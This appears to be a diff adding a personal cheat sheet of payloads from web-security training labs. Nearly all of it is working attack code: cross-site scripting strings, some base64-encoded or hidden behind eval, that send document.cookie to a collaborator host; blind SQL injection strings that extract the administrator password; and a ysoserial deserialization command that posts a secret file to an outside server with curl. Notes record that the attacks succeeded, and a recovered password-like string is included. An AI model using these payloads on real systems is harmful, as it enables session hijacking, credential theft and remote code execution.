@@ -1,0 +1,31 @@
+oastify: waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com
+
+"-fetch('https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com, {method: 'POST', mode: 'no-cors', body: document.cookie})-"test
+
+fetch('https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com, {method: 'POST', mode: 'no-cors', body: document.cookie})
+ZmV0Y2goJ2h0dHBzOi8vd2FhZ2k5ZXRjc3VoMWYxcDdobTMzajQxb3N1amlhNnoub2FzdGlmeS5jb20sIHttZXRob2Q6ICdQT1NUJywgbW9kZTogJ25vLWNvcnMnLCBib2R5OiBkb2N1bWVudC5jb29raWV9KQ==
+
+"-document.location="https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com/cookie?="+document.cookie-"test
+
+"-eval`atob`YWxlcnQoMSk=``-"test
+
+https://0a5900b103d37d53830d5fd8004a00bf.web-security-academy.net/%22https://fsbz0swcubc0jyj8p04ml2mk6bc20uoj.oastify.com%22
+
+-- This works to get user
+"-eval.call`${"fetch\x28'https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
+
+"-eval`${"console.log\x281\x29"}`-"
+
+||CASE+WHEN+(SELECT+ASCII(SUBSTRING(password,1,1))+FROM+users+where+username+%3d+'administrator')%3d97+THEN+'ASC'+ELSE+'DESC'+END
+
+
+-- This got the admin password
+%2F(CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+where+username+%3d+'administrator')%3d'a'+THEN+1+ELSE+0+END)
+
+irzrq6x2nr7tvnrzeoy8
+
+-- This got the file contents
+
+java -jar ysoserial-all.jar CommonsCollections4 "curl -X POST https://co4wwps9q88xfvf5lx0jhzih288zwtki.oastify.com/ -d @/home/carlos/secret" | gzip | base64 -w0
+
+-- It worked even though I got this error: InstantiateTransformer: Constructor threw an exception
